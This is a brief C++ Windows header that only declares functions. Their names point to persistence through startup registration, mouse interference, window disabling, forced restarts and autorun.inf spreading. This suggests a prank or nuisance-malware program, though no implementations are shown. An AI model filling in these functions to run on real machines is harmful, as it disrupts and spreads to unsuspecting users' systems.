#pragma once
#include <windows.h>
#include <cstring>
#include <iostream>
#include <string>
#include<time.h>
#include <conio.h>
#include<stdio.h>
#include <tchar.h>
using namespace std;

BOOL IsMyProgramRegisteredForStartup(PCWSTR);
BOOL RegisterMyProgramForStartup(PCWSTR, PCWSTR, PCWSTR);
void RegisterProgram();
void trick();
void crazyMouse();
void disableWindow();
void restartSystem();
void AutoRunInf();
